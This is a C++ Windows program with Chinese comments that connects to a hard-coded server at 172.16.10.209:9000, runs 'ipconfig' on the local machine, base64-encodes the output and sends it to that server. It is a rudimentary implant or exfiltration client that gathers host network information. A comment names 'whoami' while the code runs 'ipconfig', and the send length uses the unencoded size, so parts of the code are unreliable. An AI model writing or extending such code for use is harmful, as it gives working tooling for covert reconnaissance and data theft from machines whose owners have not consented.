#include "header.hpp"
#include "base64.hpp"

#include <WS2tcpip.h>   // 需要在链接时使用 -lws2_32
#include <stdio.h>
#include <stdlib.h>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")  // 链接 ws2_32.lib 库

#define SERVER_IP "172.16.10.209"  // 服务器的IP地址或域名
#define SERVER_PORT 9000  // 服务器的监听端口

using namespace std;

string exec_cmd(const char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) {
        cerr << "执行命令失败!" << endl;
        return "";
    }
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL)
            result += buffer;
    }
    _pclose(pipe);
    return result;
}

int main()
{
    // 初始化 Winsock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    int wsOK = WSAStartup(ver, &wsData);
    if (wsOK != 0)
    {
        cerr << "无法初始化 Winsock! 错误代码: " << wsOK << endl;
        return -1;
    }

    // 创建客户端 socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        cerr << "无法创建客户端 socket! 错误代码: " << WSAGetLastError() << endl;
        WSACleanup();
        return -1;
    }

    // 填充服务器地址信息
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &hint.sin_addr);

    // 连接到服务器
    int connResult = connect(clientSocket, (sockaddr*)&hint, sizeof(hint));
    if (connResult == SOCKET_ERROR)
    {
        cerr << "无法连接到服务器! 错误代码: " << WSAGetLastError() << endl;
        closesocket(clientSocket);
        WSACleanup();
        return -1;
    }

    // 执行本地命令 whoami，并将结果发送到服务器
    string cmd_output = exec_cmd("ipconfig");
    if (cmd_output.empty())
    {
        cerr << "无法获取命令输出!" << endl;
        closesocket(clientSocket);
        WSACleanup();
        return -1;
    }

    std::cout << cmd_output.c_str() << std::endl;
    // 发送命令输出到服务器
    std::string base64_output = base64_encode(cmd_output.c_str());

    send(clientSocket, base64_output.c_str(), cmd_output.size(), 0);

    cout << "已发送命令输出到服务器。" << endl;

    // 关闭 socket 和 清理 Winsock
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}
